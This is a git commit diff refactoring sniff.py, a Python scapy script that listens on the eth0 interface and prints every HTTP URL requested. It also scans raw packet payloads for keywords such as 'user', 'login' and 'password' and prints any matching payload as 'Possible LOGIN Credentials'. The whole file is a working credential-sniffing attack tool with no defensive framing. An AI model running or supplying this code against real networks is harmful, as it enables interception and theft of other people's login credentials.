a284b7191eefe7a2fdce81452a66dd69ba7835b2
gouthamk-cryptichub <k.goutham2000@gmail.com>
2020-08-23 03:17:05 -0400

    Organized with functions

--- sniff.py
+++ sniff.py
@@ -4,18 +4,23 @@ from scapy.layers import http
 
 def psniff(interface):
     scapy.sniff(iface=interface, store=False, prn=see_packets)
+def show_url(packet):
+    return "http://www." + packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
+def show_logins(packet):
+    if packet.haslayer(scapy.Raw):
+        info = packet[scapy.Raw].load  # uname&password sent in load filed in Raw layer
+        names = ["usernamr", "user", "login", "email", "uname", "password", "pass", "passwd"]
+        for word in names:
+            if word in info:
+                return info
 def see_packets(packet):
     if packet.haslayer(http.HTTPRequest):
-        URL = "http://www." + packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
-        print(URL)
-        if packet.haslayer(scapy.Raw):
-            info = packet[scapy.Raw].load                     #uname&password sent in load filed in Raw layer
-            names = ["usernamr", "user", "login", "email", "uname", "password", "pass", "passwd"]
-            for word in names:
-                if word in info:
-                    print("\n###################\n")
-                    print(info)
-                    print("\n###################\n")
-                    break
+        print("[+] HTTP Request sent URl> " + show_url(packet))
+        login_info = show_logins(packet)
+
+        if login_info:
+            print("\n###################")
+            print("[+] Detected Possible LOGIN Credentials> " + login_info)
+            print("###################\n")
 
 psniff("eth0")
